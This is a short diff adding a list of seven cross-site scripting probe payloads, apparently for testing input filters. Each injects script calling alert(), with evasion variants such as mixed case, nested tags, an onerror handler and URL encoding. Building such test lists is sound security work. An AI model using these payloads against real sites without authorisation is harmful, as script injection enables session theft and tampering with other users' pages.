@@ -1,0 +1,7 @@
+<script>alert(1)</script>
+<ScRiPt>alert(2)</ScRiPt>
+%20<script>alert(3)</script>
+<scr<script>ipt>alert(4)</scr<script>ipt>
+<IMG src=1 onerror=alert(5) style="display:none">
+%3CAonmOuseoVeR%09%3D%09alert(6)%3Ev3dm0s
+%3Cscript%3Ealert(7)%3C%2Fscript%3E
